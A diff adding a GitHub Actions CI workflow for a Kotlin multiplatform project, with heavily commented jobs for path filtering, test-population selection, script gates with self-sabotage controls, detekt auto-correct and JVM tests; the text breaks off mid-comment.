@@ -1,0 +1,1606 @@
+name: CI
+
+# Branch protection is NOT enabled on main. The `CI gate` job name is the only
+# intended required check, but there is no branch protection rule enforcing it.
+# Adding protection is a one-line GitHub API call once main is reliably green:
+#   gh api repos/{owner}/{repo}/branches/main/protection -X PUT -F required_status_checks='{"contexts":["CI gate"]}'
+#
+# ubuntu-24.04 is pinned deliberately; history and the exit plan live in
+# docs/decisions/2026-10-05-ci-action-versions-and-runner-image-pin.md.
+# Incident history for individual gates lives in their ADRs and `git log`, not here.
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+    # `labeled` is here so the `run-full-tests` label can start a full run on
+    # its own, without a new push. Without it in `types`, a pull_request event
+    # fires only on opened/synchronize/reopened — the label would be recorded
+    # and nothing would run. Same device as the device tier
+    # (.github/workflows/android-device-tests.yml), which already does this.
+    types: [opened, synchronize, reopened, labeled]
+  workflow_dispatch:
+  schedule:
+    # Nightly full test suite at 01:00 UTC — before e2e (02:00) and android-device-tests (03:00)
+    - cron: "0 1 * * *"
+
+concurrency:
+  group: ci-${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+
+
+jobs:
+  # Path-filter detection — always runs so ci-gate can wait for it; downstream jobs
+  # use its outputs to decide whether to run.
+  changes:
+    runs-on: ubuntu-24.04
+    outputs:
+      scripts: ${{ steps.filter.outputs.scripts }}
+      android: ${{ steps.filter.outputs.android }}
+      shared: ${{ steps.filter.outputs.shared }}
+      desktop: ${{ steps.filter.outputs.desktop }}
+      all: ${{ steps.filter.outputs.all }}
+      # The path set ADR + spec-kit used to gate its own workflow on. It lives
+      # here now because GitHub applies `paths:` per WORKFLOW, not per job, so
+      # the two jobs below can only be skipped by a filter computed at runtime.
+      adr: ${{ steps.filter.outputs.adr }}
+      # The population every job in this run selects, decided ONCE and
+      # published. A job that spelled its own selector would be a second answer
+      # to the same question, and two answers drift — the map once selected the
+      # fast and the slow half together while the job that called it asked for
+      # minutes.
+      population: ${{ steps.population.outputs.TEST_POPULATION }}
+      # Whether the GATE CORPUS changed. The `scripts` filter above does NOT
+      # cover `config/**`, and the corpus is what the control phase reads: the
+      # controls sabotage the gates' own declarations, and a declaration that
+      # changed is a reason to prove the gates can still fail.
+      #
+      # This is a NEW filter rather than a wider `scripts` one, because
+      # `scripts` also decides whether the `static` job runs at all — widening
+      # it would change a gate's trigger, and this change is about the control
+      # phase's condition, not about which gates run.
+      gates: ${{ steps.filter.outputs.gates }}
+    steps:
+      - uses: actions/checkout@v7
+      - uses: dorny/paths-filter@v3
+        id: filter
+        with:
+          filters: |
+            scripts:
+              - 'scripts/**'
+              - '.github/**'
+              - '.githooks/**'
+              - 'docs/**'
+            gates:
+              - 'scripts/**'
+              - 'config/**'
+              - '.github/**'
+              - '.githooks/**'
+            android:
+              - 'androidApp/**'
+              - 'shared/src/android*/**'
+              - 'gradle.properties'
+            shared:
+              - 'shared/src/commonMain/**'
+              - 'shared/src/androidMain/**'
+              - 'shared/src/jvmMain/**'
+            desktop:
+              - 'desktopApp/**'
+              - 'shared/src/jvmMain/**'
+            adr:
+              - 'docs/decisions/**'
+              - 'openspec/changes/**'
+              - 'openspec/schemas/**'
+              - '.specify/**'
+            all:
+              - '**'
+
+      # The population is decided HERE, in the one job that has nothing else to
+      # do, and every job that runs tests reads the answer from this output.
+      #
+      #   pull_request without the label → fast
+      #   pull_request with    the label → full
+      #   push                          → fast
+      #   schedule / manual             → full
+      #
+      # The population is a NAME. The tags it selects live in
+      # `config/test-populations.properties`, which the build and the gates
+      # read: the workflow never spells a tag list, so the workflow and the
+      # build cannot disagree about what "full" means.
+      #
+      # The label arrives two ways and BOTH are needed: the `labeled` event
+      # carries it in `github.event.label.name`, and every later push carries
+      # it in the PR's label list. Reading only one of them means the label
+      # works until the next commit and then silently stops working.
+      #
+      # The output is written under the name `TEST_POPULATION` on purpose: the
+      # population-parity gate reads the workflow's text and asks which
+      # populations this repository can select, and a workflow that no longer
+      # named one would leave that question vacuous.
+      - name: Select test population
+        id: population
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          LABEL_NAME: ${{ github.event.label.name }}
+          PR_LABELS: ${{ toJSON(github.event.pull_request.labels.*.name) }}
+        run: |
+          case "$EVENT_NAME" in
+            schedule|workflow_dispatch) echo "TEST_POPULATION=full" ;;
+            *)
+              # A glob match, not `printf | grep`: the JSON label list is a
+              # single string, and a pipe here would make the step's status
+              # the grep's rather than the case's.
+              case "$LABEL_NAME:$PR_LABELS" in
+                *run-full-tests*) echo "TEST_POPULATION=full" ;;
+                *)               echo "TEST_POPULATION=fast" ;;
+              esac
+              ;;
+          esac >> "$GITHUB_OUTPUT"
+
+      # The population parity gate compares the SELECTED POPULATIONS and cannot
+      # see what is behind the variable: an empty TEST_POPULATION would silently
+      # mean "the Gradle default", which excludes slow. This step closes that
+      # hole: the name has to be one the populations file declares, or the job
+      # stops here. The file is the definition — the shell does not keep a
+      # second list of the names.
+      #
+      # The file carries more than the names: each population's PROPERTIES live
+      # there too ("does this population include the slow half?"), and the
+      # steps that ask such a question read the answer from the file rather
+      # than comparing the name to a literal. That is what keeps a population
+      # nobody has written yet from needing a line in this workflow.
+      - name: Test population is one of the known ones
+        env:
+          TEST_POPULATION: ${{ steps.population.outputs.TEST_POPULATION }}
+        run: |
+          if ! grep -q "^${TEST_POPULATION}=" config/test-populations.properties; then
+            echo "unknown TEST_POPULATION='$TEST_POPULATION' — the known ones are:"
+            grep -o '^[a-z]*=' config/test-populations.properties | tr -d '='
+            exit 1
+          fi
+
+  # ~1 min, no JVM, no Gradle. Runs every script gate and reports ALL of their
+  # failures, not the first one.
+  static:
+    name: Static gates
+    runs-on: ubuntu-24.04
+    # The suite runs the gates and then the control phase — the harness that
+    # proves each gate can fail. The phase edits the tree the gates read, so it
+    # runs after them and alone; that is minutes on top of the suite, and a
+    # timeout that fires mid-phase leaves a checkout with a sabotaged file.
+    timeout-minutes: 25
+    needs: [changes]
+    # No `contents: write` here any more: the permission existed for the
+    # detekt auto-correct step, and that step now lives in the `detekt` job —
+    # the one job that judges detekt. This job judges the gates.
+    permissions:
+      # The Gradle cache is read from the workflow cache, and reading it needs
+      # `actions: read`. Without it the cache restore is refused and the gate
+      # that resolves the build runs against a cold Gradle home again.
+      actions: read
+    # Run when scripts/docs changed, or when anything changed on main (always), or on
+    # workflow_dispatch (manual trigger).
+    if: >
+      (
+        needs.changes.outputs.scripts == 'true'
+        || needs.changes.outputs.all == 'true'
+        || github.ref == 'refs/heads/main'
+        || github.event_name == 'workflow_dispatch'
+      )
+    steps:
+      # The baseline ratchet compares the working tree against the merge-base
+      # with `origin/main`, so the base reference has to exist. A shallow
+      # checkout has no such ref: the comparison would fall back to `HEAD`,
+      # and on a pull request `HEAD` is the file against itself — a check that
+      # cannot see the branch's own growth is not a check.
+      - uses: actions/checkout@v7
+        with:
+          fetch-depth: 0
+
+      # One gate in this job needs the build: `declared dependencies are used`
+      # asks Gradle which files each configuration resolved and reads the jars
+      # to learn the package roots they contribute. Without a Gradle home to
+      # restore, every run downloaded the distribution and resolved every
+      # configuration from scratch — 113 s on a good day, and killed at the
+      # 300 s budget on a bad one, with the same tree and the same code.
+      #
+      # The cache is what makes the gate's cost stable: the dependency cache is
+      # keyed on the Gradle files, not on the branch, so a pull request restores
+      # what main resolved. The action is read-only off main, so a pull request
+      # cannot evict or poison the cache main depends on.
+      #
+      # This is the same action the `tests` job uses — one cache policy for
+      # every workflow (ADR 2026-10-05-ci-action-versions-and-runner-image-pin).
+      - uses: ./.github/actions/setup-jvm-gradle
+        with:
+          cache-encryption-key: ${{ secrets.GRADLE_ENCRYPTION_KEY }}
+
+      # uv manages the Python toolchain and project dependencies from pyproject.toml.
+      # python-version is still declared so setup-python pins the interpreter;
+      # uv reads it from there rather than managing its own version pins.
+      # venv + sgate + junitparser + yamllint + actionlint + shellcheck, once.
+      # See .github/actions/setup-python-tools/action.yml for what each of the
+      # four earlier attempts at installing these was missing.
+      - name: Set up gate tooling
+        uses: ./.github/actions/setup-python-tools
+
+      # The gate-tooling preflight: every tool the gate suite shells out to
+      # (sgate, junitparser, lychee, yamllint, actionlint, shellcheck) must be
+      # present, and the preflight names the fix when one is not.
+      #
+      # It ran only in check.sh, so a CI job whose tool install silently
+      # degraded discovered the missing tool as a gate traceback — a
+      # ModuleNotFoundError in the gate scripts' own tests, "lychee: command
+      # not found" in the link gate — a symptom three steps away from the
+      # cause. Here it is a named step that fails the job before any gate runs.
+      #
+      # AFTER the install, never before: a preflight that checks for tools
+      # before they are installed can only ever fail. It is the gate-tooling
+      # preflight; the step below is a different preflight (the repo-tools
+      # environment check), and the two names say which is which.
+      - name: Preflight gate tooling
+        run: bash scripts/ci/preflight-gate-tools.sh
+
+      # Path-gated preflight: only validate tools when the PR touches CI tooling.
+      # Skipped for pure app-code PRs (shared/**, androidApp/**, desktopApp/**).
+      #
+      # AFTER the install, deliberately. It used to sit at step 3, ahead of the
+      # Python setup at step 5, so it asserted `junitparser` was missing on every
+      # run and `sgate run-all` (step 7) never ran — every static gate in
+      # scripts/ci/static-gates.sh went unexecuted and a stale committed coverage
+      # matrix merged unnoticed. A preflight that checks for tools before they
+      # are installed can only ever fail.
+      - name: Preflight environment check
+        uses: ./.github/actions/setup-repo-tools
+
+      - uses: actions/setup-node@v6
+        with:
+          node-version: 22
+
+      # Deno runs the Edge Function's own tests — the server half of the Google
+      # OAuth exchange, which holds a client secret and redeems a one-time code.
+      # The npm package is the official binary; the version is pinned like every
+      # other tool here, because a test run that changes with the tool is a test
+      # run nobody can reproduce.
+      - name: Set up Deno
+        run: npm install -g deno@2.9.5
+
+      # Replaced gate() function + collect_and_report() from static-gates.sh with
+      # sgate run-all: single CLI entry point, parallel execution, aggregate exit,
+      # unified JSON for CI parsers.  static-gates.sh is now a pure registry (source
+      # of truth for gate names and commands — both sgate run-all and check.sh read it).
+      #
+      # `--with-controls` also proves that the gates *can* fail: the sabotage
+      # harness applies each gate's control, runs the gate, and puts the file
+      # back. It runs after the parallel pass, because it edits the tree the
+      # gates read. Without it, a gate whose pattern matches nothing is green
+      # forever — that is how a link-grammar gate shipped: the suite reported
+      # every gate as passed while the gate found nothing at all.
+      #
+      # The Gradle-backed controls stay in the JVM job: they need a daemon, and
+      # the fast suite is the place where a fast gate is proved.
+      #
+      # The control phase runs when the GATE CORPUS changed, or on the schedule.
+      # Otherwise the cheap pass runs alone. The corpus is `scripts/**`,
+      # `config/**` and `.github/**` — the gate's own declarations, the
+      # configuration it reads and the workflow it reads. A change to the app
+      # cannot make a gate stop working, so proving that the gates can still
+      # fail is not that change's business; a change to the gates themselves is
+      # exactly its business. The condition is computed in the `changes` job
+      # (`needs.changes.outputs.gates`) and carried here as a plain value, so
+      # the shell asks the job and not a second copy of the corpus.
+      - name: Script gates (sgate run-all)
+        env:
+          WITH_CONTROLS: ${{ needs.changes.outputs.gates == 'true' || github.event_name == 'schedule' }}
+        run: |
+          set -o pipefail
+          if [ "$WITH_CONTROLS" = "true" ]; then
+            sgate run-all --with-controls || exit 1
+          else
+            sgate run-all || exit 1
+          fi
+
+      - name: Speckit validate
+        env:
+          # Pinned, with a working default: an unpinned `npx` makes the gate change
+          # under you, but requiring a repository variable before the first run
+          # lands turns a safety pin into a day-one outage. Override by setting the
+          # variable when the pin needs to move.
+          SPECKIT_VERSION: ${{ vars.SPECKIT_VERSION || vars.OPENSPEC_VERSION || '1.14.0' }}
+        run: >
+          npx --yes "@fission-ai/openspec@${SPECKIT_VERSION}" validate --all --json --strict
+
+      # No second checkout here. The one at the top of this job is already at
+      # `github.sha`, and a second sparse checkout broke the job in two ways:
+      # it dropped `scripts/`, so the step below ran a script that no longer
+      # existed (exit 127), and it dropped `.github/actions/setup-python-tools`,
+      # so the local action could not be archived at job teardown and the job
+      # failed there instead. The gate run above writes only into `.venv/` and
+      # `build/`, both untracked, so a fresh tree buys nothing. The JVM job runs
+      # the same script with this same shape and is green.
+      #
+      # The detekt auto-correct step that used to sit HERE moved to the
+      # `detekt` job: detekt's verdict belongs in one job, and two jobs that
+      # analyse the same tree are two verdicts nobody reads.
+
+  # One Gradle invocation => one JVM start, one configuration phase, and the
+  # tests run ONCE. The previous shape ran jvmTest twice (this job and
+  # slow-tests), once more inside koverReport, and mcp-server:test twice (here
+  # and in its own job).
+  #
+  # This job is deliberately NOT split further. Three couplings inside the old
+  # monolith made a six-leaf split produce a green run that measured the wrong
+  # thing, and it was withdrawn for that reason — see
+  # docs/decisions/2026-10-05-ci-checks-run-in-parallel.md. What is here respects
+  # all three: the run stamp, the count and coverage floors, and the flake
+  # comparison all read results this same job produced, so they stay together.
+  # The gate tooling, on its own job.
+  #
+  # These three checks are about the gates, not about the app: they run the
+  # gate scripts, prove the controls can fail, and probe every gate once to
+  # see which ones die. They used to sit in the `tests` job, behind 40 minutes
+  # of Gradle, where they added nothing to the wall time of the job that
+  # matters — they ran *after* it. On their own job they run in parallel with
+  # the JVM tests, so a broken gate is red while the app's own tests are still
+  # running.
+  #
+  # The wiring gate stays in the `tests` job: one of its controls reads the
+  # JUnit XML the Gradle step produces, and a control that cannot read its
+  # input proves nothing.
+  meta:
+    name: Gate tooling
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    needs: [changes]
+    if: >
+      (
+        needs.changes.outputs.scripts == 'true'
+        || needs.changes.outputs.all == 'true'
+        || github.ref == 'refs/heads/main'
+        || github.event_name == 'workflow_dispatch'
+      )
+    steps:
+      - uses: actions/checkout@v7
+
+      # Same action as the other jobs, one reason: the checks import `sgate`,
+      # which the action installs.
+      - name: Set up gate tooling
+        uses: ./.github/actions/setup-python-tools
+
+      # Deno, for the same reason the static job installs it: the liveness
+      # probe below runs EVERY registered gate once, and the Edge Function's own
+      # tests are one of them. A gate the probe cannot run is reported as
+      # unrunnable, and the probe fails on it — a gate that needs a tool the
+      # probing job does not have is a gate that never runs anywhere.
+      - name: Set up Deno
+        run: npm install -g deno@2.9.5
+
+      # The gate scripts' own unit tests: the regression tests for the wiring
+      # gate, the liveness probe and the controls.
+      #
+      # The runner writes a JUnit XML report, and the report is uploaded as an
+      # artifact: the rule this repository already wrote down for the Kotlin
+      # tests is that the cause of a failed test is in the artifact and not in
+      # the step log — and a step log that says "FAILED (failures=1)" among
+      # thousands of assertions says nothing about which one.
+      - name: Gate scripts' own unit tests
+        run: >-
+          python3 scripts/run-gate-tests.py
+          --junit-xml build/diagnostics/gate-tests/junit.xml
+
+      - name: Upload gate test results
+        if: ${{ !cancelled() }}
+        uses: actions/upload-artifact@v7
+        with:
+          name: gate-junit-results
+          path: build/diagnostics/gate-tests/*.xml
+          if-no-files-found: error
+          retention-days: 7
+
+      # "Gates are alive" — the probe that runs every registered gate once and
+      # reports the ones that die. It is the second full pass over the gate
+      # corpus (63 seconds), and it used to be inside the static job, where it
+      # doubled that job's cost to prove that gates do not crash.
+      #
+      # It probes the gates named in scripts/ci/static-gates.sh, and it is not
+      # one of them: a probe that probed itself would launch every gate, and
+      # every gate would launch the probe.
+      - name: Gates are alive
+        run: python3 scripts/check-gate-liveness.py
+
+  # ── The detekt job ───────────────────────────────────────────────────────
+  #
+  # Detekt's verdict, and nothing else. It runs wherever the suite job runs —
+  # a pull request, a push to the trunk, the schedule — because detekt is
+  # judged on every path, not only on pull requests.
+  #
+  # Detekt used to be judged TWICE: once by the `static` job (which auto-fixed
+  # the tree it had already checked) and once by the suite job's invocation.
+  # Two analyses of the same tree, one of them invisible in the verdict. This
+  # job holds the auto-correct and the verdict, in that order, so the verdict
+  # measures an already-corrected tree.
+  detekt:
+    name: detekt
+    runs-on: ubuntu-24.04
+    timeout-minutes: 25
+    needs: [changes]
+    if: >
+      (
+        needs.changes.outputs.android == 'true'
+        || needs.changes.outputs.shared == 'true'
+        || needs.changes.outputs.desktop == 'true'
+        || needs.changes.outputs.all == 'true'
+        || github.ref == 'refs/heads/main'
+        || github.event_name == 'workflow_dispatch'
+      )
+    permissions:
+      actions: read
+      # `contents: write` for the auto-correct branch and for nothing else.
+      contents: write
+    steps:
+      - uses: actions/checkout@v7
+
+      - uses: ./.github/actions/setup-jvm-gradle
+        with:
+          cache-encryption-key: ${{ secrets.GRADLE_ENCRYPTION_KEY }}
+
+      # Correct first, measure second — and do not let the correction hide the debt.
+      #
+      # `--auto-correct` works; the claim that it was inert is superseded by
+      # docs/decisions/2026-10-17-detekt-auto-correct-works-use-it.md. It runs
+      # before the verdict below, so that verdict measures a corrected tree —
+      # the same order `just detekt-fix` and the pre-push hook use.
+      #
+      # One Gradle invocation per module, never several in one. Measured on
+      # 2026-10-17 with a planted StringTemplate violation: `:shared:detekt
+      # :desktopApp:detekt --auto-correct` reported the finding and rewrote
+      # nothing, while the same two tasks one invocation each did rewrite it —
+      # and `:desktopApp:detekt :shared:detekt` in a single invocation rewrote it
+      # again. The flag reaches only the last detekt task of an invocation, so a
+      # list silently corrects one module and silently skips the rest. That is
+      # indistinguishable from "inert" unless you check the file afterwards, which
+      # is why the old ADR's conclusion was plausible for a week.
+      #
+      # No `--rerun-tasks` here (unlike the hook): this is the job's first Gradle
+      # invocation, so no detekt task can be UP-TO-DATE over the checked-out tree.
+      # `--no-build-cache` for the same reason — a restored analysis rewrites
+      # nothing. The step's only output is the correction, so it must not be served
+      # from a cache.
+      #
+      # The script commits and pushes the auto-correct result to
+      # `detekt-auto-fix/detekt/<run-id>`. The CI verdict is still produced by the
+      # separate `git diff` step of the script, which now measures an
+      # already-fixed tree. See
+      # docs/decisions/2026-10-17-detekt-auto-fix-ci-commit.md.
+      - name: Detekt auto-correct (commit + push)
+        run: bash scripts/ci/detekt-auto-fix.sh "detekt" "${{ github.run_id }}"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      # The verdict: the modules CI judges, as ONE invocation, because
+      # this one does not correct anything — `--auto-correct` is what only
+      # reaches the last task of an invocation, and there is none here.
+      #
+      # The LIST is read from the build, not written here: the module graph
+      # knows which modules have a detekt verdict, and a list written out by
+      # hand goes stale silently — a module the build declares and the list
+      # does not name is a module nobody judges.
+      #
+      # `:pro:detekt` is NOT here on purpose: `:pro` is only included under
+      # -PwithPro=true (settings.gradle.kts:120-126), so it belongs to the matrix
+      # leg that passes that flag.
+      #
+      # `-Pcoverage.enabled=false`: the pull-request path does not measure
+      # coverage, and this job runs no tests — but the property says so in the
+      # job rather than in a default somebody changes later.
+      - name: Gradle (detekt)
+        run: |
+          set -o pipefail
+          mapfile -t DETEKT_TASKS < <(python3 scripts/changed-modules.py --detekt-tasks)
+          if [[ "${#DETEKT_TASKS[@]}" == "0" ]]; then
+            echo "the module graph names no detekt task — CI would judge nothing" >&2
+            exit 1
+          fi
+          ./gradlew --continue \
+            --no-parallel \
+            "${DETEKT_TASKS[@]}" \
+            -Pcoverage.enabled=false \
+            2>&1 | tee build.log
+
+  # ── The affected-test job ─────────────────────────────────────────────────
+  #
+  # The fast signal: the tests this change can break, and nothing else. It
+  # runs beside the suite job, not instead of it — the suite job is the
+  # verdict, this job is the answer to "how long until I know".
+  #
+  # It runs on pull requests only. On a push to the trunk the base reference
+  # IS the head, so the comparison is empty and the job would report "the
+  # change selects nothing" for every push — a fact about the push, not about
+  # the change.
+  quick:
+    name: Affected tests
+    runs-on: ubuntu-24.04
+    timeout-minutes: 25
+    needs: [changes]
+    if: ${{ github.event_name == 'pull_request' }}
+    permissions:
+      actions: read
+      contents: read
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          # The map compares against `origin/main`, so the base reference has to
+          # exist. A shallow checkout has no such ref, and the tool refuses a
+          # base it cannot resolve — a comparison that could not be made is not
+          # a comparison that found nothing.
+          fetch-depth: 0
+
+      - uses: ./.github/actions/setup-jvm-gradle
+        with:
+          cache-encryption-key: ${{ secrets.GRADLE_ENCRYPTION_KEY }}
+
+      # Three outcomes, and the job says which one happened:
+      #
+      #   selected     the map named test classes, and they ran below
+      #   empty        the change claims no test class — nothing to run, and
+      #                that is an ANSWER, not a failure
+      #   uncomputable the comparison could not be made — the tool refused, and
+      #                the job fails, because a broken map must not read as a
+      #                green run that tested nothing
+      #
+      # The tool's output contract is what makes the three distinguishable: an
+      # empty selection is reported on stdout, where this step reads it, and a
+      # failed comparison exits non-zero.
+      #
+      # The FAST population, and it is the fast population by contract (R5):
+      # this job answers "what is worth running first", and the answer is the
+      # fast half. The `changes` job publishes the population the SUITE job
+      # runs — on a `run-full-tests` pull request that is `full` — so the two
+      # jobs select different halves on purpose. The signal runs BESIDE the
+      # suite; it is not a copy of it, and it does not claim to be.
+      - name: Select the affected tests
+        id: selection
+        run: |
+          set -o pipefail
+          if ! python3 scripts/test-impact-map.py --command --population fast > selection.txt; then
+            echo "outcome=uncomputable" >> "$GITHUB_OUTPUT"
+            echo "the selection could not be computed — see the step's output"
+            exit 1
+          fi
+          if grep -q '^test-impact-map: the change selects no test class$' selection.txt; then
+            echo "outcome=empty" >> "$GITHUB_OUTPUT"
+          else
+            echo "outcome=selected" >> "$GITHUB_OUTPUT"
+          fi
+          cat selection.txt
+
+      - name: The change selects no test class
+        if: steps.selection.outputs.outcome == 'empty'
+        run: echo "the change claims no test class — there is nothing to run, and that is an answer"
+
+      - name: Run the affected tests
+        if: steps.selection.outputs.outcome == 'selected'
+        run: |
+          set -o pipefail
+          while read -r command; do
+            [ -n "$command" ] || continue
+            # `-Pcoverage.enabled=false`: this job is the fast signal, and the
+            # Kover agent is the difference between a signal and a wait. The
+            # coverage job is where the measurement belongs.
+            echo "running: $command -Pcoverage.enabled=false"
+            eval "$command -Pcoverage.enabled=false"
+          done < selection.txt
+
+  tests:
+    name: JVM tests
+    runs-on: ubuntu-24.04
+    # 75 minutes, and the number is measured: the instrumented coverage run —
+    # the one the Kover agent multiplies — takes 37 min 25 s for the fast
+    # population and 33 min 23 s for the full one on the 16-vCPU development
+    # host (the measurements are recorded in
+    # openspec/changes/ci-fast-only-pr-full-on-schedule/tasks.md, section 8).
+    # A timeout has to cover the runner as well as the run, and this job's
+    # runner is not the machine the number was measured on.
+    #
+    # The old 40 minutes was not enough for the full population, and a timeout
+    # that fires on a healthy run reports a failure that says nothing about the
+    # code: the job is killed after three quarters of an hour and the
+    # conclusion is about the clock.
+    timeout-minutes: 75
+    needs: [changes]
+    # Run when any app code changed (android/shared/desktop), or always on main,
+    # or on workflow_dispatch.
+    if: >
+      (
+        needs.changes.outputs.android == 'true'
+        || needs.changes.outputs.shared == 'true'
+        || needs.changes.outputs.desktop == 'true'
+        || needs.changes.outputs.all == 'true'
+        || github.ref == 'refs/heads/main'
+        || github.event_name == 'workflow_dispatch'
+      )
+    permissions:
+      actions: read # flake analysis downloads the previous run's results
+      # No `contents: write` here any more: the permission existed for the
+      # detekt auto-correct branch, and that step now lives in the `detekt`
+      # job — the one job that needs it, and the one that judges detekt.
+    env:
+      # The population, decided ONCE by the `changes` job and read here. Every
+      # Gradle invocation in this job that can run tests names the same one,
+      # and the literal stays `-Ptest.population="$TEST_POPULATION"` — the
+      # parity gate reads that as an opaque token, which is what lets the
+      # decision live in one place instead of in every job.
+      TEST_POPULATION: ${{ needs.changes.outputs.population }}
+      # Coverage is measured only where it is wanted (push/schedule/dispatch/full PR).
+      # A single run carries both verdicts: tests always, coverage conditionally.
+      COVERAGE_ENABLED: ${{ (github.event_name == 'push' || github.event_name == 'schedule' || github.event_name == 'workflow_dispatch' || (github.event_name == 'pull_request' && (github.event.label.name == 'run-full-tests' || contains(github.event.pull_request.labels.*.name, 'run-full-tests')))) && 'true' || 'false' }}
+    steps:
+      - uses: actions/checkout@v7
+
+      - uses: ./.github/actions/setup-jvm-gradle
+        with:
+          cache-encryption-key: ${{ secrets.GRADLE_ENCRYPTION_KEY }}
+
+      # Same action as the static job, one reason: this job runs
+      # `python3 scripts/check-gate-wiring.py` ("Gates are wired and can fail"),
+      # whose `import click` sits at module scope. The job that exists to prove
+      # gates can fail could not run the gate.
+      #
+      # The YAML and actionlint linters are off here because the two gates that
+      # use them are `bash -c` lines in the registry, not script gates: Part B
+      # never runs them, and this job does not run the registry. The link
+      # checker stays ON: `scripts/check-doc-links.sh` IS a script gate, so
+      # Part B runs it — first on the clean tree, then on a sabotaged one.
+      # With lychee missing, the clean-tree run failed ("already fails on a
+      # clean tree") and the control could not prove anything. A control that
+      # cannot run is not a control.
+      - name: Set up gate tooling
+        uses: ./.github/actions/setup-python-tools
+        with:
+          with-yaml-lint: 'false'
+          with-action-lint: 'false'
+
+      # Deno, for the same reason the static and meta jobs install it: the
+      # wiring check below runs every registered gate's control, and the Edge
+      # Function's own tests are one of them — `deno test` on a fixture. The
+      # control cannot run without the binary, and a control that cannot run
+      # proves nothing: it dies with FileNotFoundError before it ever says
+      # whether the gate can fail.
+      - name: Set up Deno
+        run: npm install -g deno@2.9.5
+
+      # A fresh checkout runs every test task, so results older than this stamp
+      # cannot belong to this run.
+      - name: Stamp run start
+        run: echo "RUN_STARTED=$(date +%s)" >> "$GITHUB_ENV"
+
+      # ── The test population is decided ONCE, in the `changes` job ───────────
+      #
+      # Every Gradle invocation in this job that can run tests must select the
+      # same population. The decision is made in one place and every later step
+      # READS it — the same pattern the device tier uses for its two modes
+      # (REQ-20), applied to the JVM tier.
+      #
+      #   pull_request without the label → fast
+      #   pull_request with    the label → full
+      #   push                          → fast
+      #   schedule / manual             → full
+      #
+      # The population is a NAME. The tags it selects live in
+      # `config/test-populations.properties`, which the build and the gates
+      # read: the workflow never spells a tag list, so the workflow and the
+      # build cannot disagree about what "full" means.
+      #
+      # The label arrives two ways and BOTH are needed: the `labeled` event
+      # carries it in `github.event.label.name`, and every later push carries
+      # it in the PR's label list. Reading only one of them means the label
+      # works until the next commit and then silently stops working.
+      #
+      # The two steps that decided and checked it now live in the `changes`
+      # job, and this job reads the answer from `needs.changes.outputs`.
+      # One decision, one place — a job that spelled its own selector would be
+      # a second answer to the same question, and two answers drift.
+      #
+      # `-Ptest.population="$TEST_POPULATION"` is repeated on every Gradle
+      # invocation in this job, not only the test run below, and it is not
+      # redundancy. An absent population maps to `excludeTags("slow")` in every
+      # module's `useJUnitPlatform` block, so an invocation that re-runs a test
+      # task without it re-measures a *narrower* population while reporting green
+      # — measured in run 38933517902, where the advisory kover table step re-ran
+      # `:desktopApp:test` and dropped every `@Tag("slow")` scenario class. Same
+      # population, whichever invocation ends up executing the task.
+      #
+      # One variable, six invocations: the population is decided once (the
+      # "Select test population" step in the `changes` job) and read everywhere.
+      # Two jobs with two literal selectors would have needed ~150 lines of
+      # duplicated YAML and bought nothing over REQ-17's "one population per
+      # job".
+
+      # Detekt is judged in its own job now (`detekt`), which holds the
+      # auto-correct and the eight detekt tasks and nothing else. It used to
+      # be judged here, in the same invocation as the tests, and by the
+      # `static` job as well — two analyses of the same tree, one of them
+      # invisible in the verdict. The reasoning is in the `detekt` job's
+      # comment; what stays here is the reason the two halves were apart:
+      # the auto-correct runs BEFORE the verdict, so the verdict measures an
+      # already-corrected tree.
+
+      # The test tasks are named here, one by one.
+      #
+      # The coverage entry point (`koverReport`) used to be what put them into
+      # this invocation: it dependsOn :shared:jvmTest,
+      # :shared:testAndroidHostTest, :desktopApp:test, :mcp-server:test and
+      # :androidApp:test (build.gradle.kts:390-399). That is a second copy of
+      # the list that has to stay in step with kover's — and it is exactly how
+      # kover silently stops measuring a module. Naming the tasks here is the
+      # list itself, and the coverage job keeps the aggregate.
+      #
+      # :mcp-server:jar is REQUIRED in this same invocation. McpServerEndToEndTest
+      # resolves build/libs/mcp-server.jar and skips itself when it is absent
+      # (McpServerEndToEndTest.kt:63) — a silent pass, not a failure, and the floor
+      # below is what catches it.
+      #
+      # :pro:detekt is NOT here on purpose: :pro is only included under
+      # -PwithPro=true (settings.gradle.kts:120-126), so it belongs to the matrix
+      # leg that passes that flag.
+      #
+      # -Dsingularity.test.steps=true fills the opt-in failure bundle.
+      # -Dsingularity.test.a11y=fail makes accessibility findings fatal.
+      # --continue: one red task must not hide the rest of the verdicts.
+      # The build cache is ON here, and it was not before. The step used to pass
+      # --no-build-cache, which excluded every task in the invocation -- the
+      # compilation included -- while the comment next to it claimed the cache
+      # stayed "warm for configuration and compilation tasks". The flag contradicted
+      # the comment, and the comment was what the job was supposed to be doing.
+      #
+      # The exclusion that matters is in the build, not in the step: the root
+      # build.gradle.kts marks every Test task `outputs.cacheIf { false }`, so a
+      # test task is never served FROM-CACHED and the test-counts gate always
+      # measures a real run. Everything else -- the Kotlin compilation of shared,
+      # desktopApp and androidApp, the jar, the analysis -- is cacheable and is
+      # reused between runs of the same commit. That is where the job's half hour
+      # went.
+      #
+      # A property of the task rather than of the invocation, so it holds in the
+      # pre-push hook and in a local run too, and it cannot be forgotten by the
+      # next step that adds a Gradle call.
+      # --no-parallel: org.gradle.parallel=true in gradle.properties lets two test
+      # tasks fork JVMs concurrently, which is the collision behind #471's
+      # EOFException in the jvmTest executor. The CLI flag overrides the property;
+      # determinism is worth the lost cross-project parallelism (same call the
+      # pre-push hook makes).
+      # The Gradle log is captured so check-test-runs.py can exempt UP-TO-DATE tasks
+      # from the freshness check (a second consecutive run would otherwise falsely flag
+      # a legitimately cached task as stale).
+      # Test properties are passed as -D on the Gradle command line, NOT via
+      # GRADLE_OPTS: that reaches the Gradle client JVM only, and worked before
+      # solely because --no-daemon ran the build inside it. desktopApp's harness
+      # reads these as system properties of the forked test JVM
+      # (DesktopAppHarness.kt:138-140), forwarded via providers.systemProperty
+      # (desktopApp/build.gradle.kts:166-177).
+      #
+      # Retry flags are spelled here, one GitHub expression per flag, instead of
+      # arriving as a single RETRY_ARGS env var expanded unquoted. Unquoted word
+      # splitting is exactly what actionlint's shellcheck pass reports as SC2086,
